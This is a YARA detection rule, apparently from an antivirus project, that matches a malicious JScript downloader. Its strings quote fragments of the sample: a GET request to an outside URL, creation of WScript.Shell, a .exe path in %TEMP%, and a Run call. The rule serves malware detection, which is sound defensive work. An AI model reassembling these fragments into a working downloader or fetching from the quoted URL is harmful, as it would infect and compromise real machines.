rule sig_20160330_7ad8989c0b63005e18a1ad7a50e3e6b2 {
  meta:
    description = "datamaliciousorder - file 20160330_7ad8989c0b63005e18a1ad7a50e3e6b2.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "8b99990a31b0e4587b02bdef029d7d5688fb1c3982e7bbe124890e3a87e7e44d"

  strings:
    $s1  = "TT[Q](\"GET\", \"http://aaacollectionsjewelry.com/x9djsa\", false);" fullword ascii
    $s2  = "function W(TY, MP){K = K * 1; return TY - MP;};" fullword ascii
    $s3  = "var C0 = function R() {return WScript[OP](\"WScript\"+\".Shell\");}(), MT = 11;" fullword ascii
    $s4  = "if (TT[\"readystate\"] < 2 * 2) continue;" fullword ascii
    $s5  = "function J(){return X + \"\";};" fullword ascii
    $s6  = "function B() {return C0[\"ExpandEnvironmentStrings\"](\"%TE\"+\"MP%/\") + \"cSuwURd7h49P7a.ex\" + \"e\";};" fullword ascii
    $s7  = "function M() {return ((T == true) && (T == I)) ? 1 : K;};" fullword ascii
    $s8  = "function YM(DS){C0[\"Run\"](DS, K, K);};" fullword ascii
    $s9  = "function A(){return 22;};" fullword ascii
    $s10 = "}while (HE);" fullword ascii
    $s11 = "function RF()" fullword ascii
    $s12 = "return W(U, L);" fullword ascii
    $s13 = "var TP = new this[\"Date\"]();" fullword ascii
    $s14 = "function C(W0) {var S = (1, 2, 3, 4, 5, W0); return S;};" fullword ascii
    $s15 = "function P(){return OP;};" fullword ascii
    $s16 = "var I = false;" fullword ascii
    $s17 = "I = true; " fullword ascii
    $s18 = "T = true; " fullword ascii
    $s19 = "var T = false;" fullword ascii
    $s20 = "var UG = false;" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}